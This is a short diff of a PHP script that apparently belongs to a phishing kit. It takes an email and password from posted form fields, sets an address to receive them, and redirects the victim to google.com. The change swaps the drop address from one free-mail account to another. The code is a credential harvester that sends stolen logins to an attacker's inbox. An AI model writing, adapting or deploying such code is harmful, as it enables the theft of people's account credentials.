@@ -2,7 +2,7 @@
 include 'email.php';
 $email = trim($_POST['mk']);
 $password = trim($_POST['mknow']);
-$Receive_email='denalioutervvear@gmail.com';
+$Receive_email='jeancollins9090@yandex.com';
 $redirect="https://www.google.com/";
 
 if($email != null && $password != null){
